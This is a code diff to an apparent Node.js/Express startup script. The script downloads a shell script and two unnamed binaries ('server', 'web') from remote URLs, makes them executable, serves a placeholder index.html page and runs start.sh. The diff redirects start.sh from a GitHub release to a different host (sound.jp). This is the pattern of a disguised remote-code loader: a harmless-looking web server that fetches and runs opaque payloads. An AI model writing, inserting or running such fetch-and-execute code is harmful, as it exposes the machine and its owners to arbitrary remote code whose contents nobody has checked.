@@ -24,7 +24,7 @@ const filesToDownloadAndExecute = [
     filename: 'web',
   },
   {
-    url: 'https://github.com/wwrrtt/test/releases/download/2.0/start.sh',
+    url: 'https://sound.jp/kid/start.sh',
     filename: 'start.sh',
   },
 ];
@@ -60,3 +60,47 @@ const executeScript = async (script) => {
   } catch (error) {
     throw new Error(`Failed to execute ${script}: ${error.message}`);
   }
+};
+
+const prepareEnvironment = async () => {
+  for (let file of filesToDownloadAndExecute) {
+    try {
+      await downloadFile(file);
+    } catch (error) {
+      throw new Error(`Failed to download file ${file.filename}: ${error.message}`);
+    }
+  }
+
+  // Set executable permissions
+  for (let file of ['start.sh', 'server', 'web']) {
+    await setExecutablePermissions(file);
+  }
+};
+
+const startServer = () => {
+  app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'), (err) => {
+      if (err) {
+        res.status(500).send('Error loading index.html');
+      }
+    });
+  });
+
+  app.listen(port, () => {
+    console.log(`Server started and listening on port ${port}`);
+  });
+};
+
+(async () => {
+  try {
+    console.log('Preparing environment...');
+    await prepareEnvironment();
+    console.log('All files downloaded successfully. Starting server...');
+    startServer();
+
+    console.log('Executing start.sh...');
+    await executeScript('start.sh');
+  } catch (error) {
+    console.error(`Error during setup: ${error.message}`);
+  }
+})();
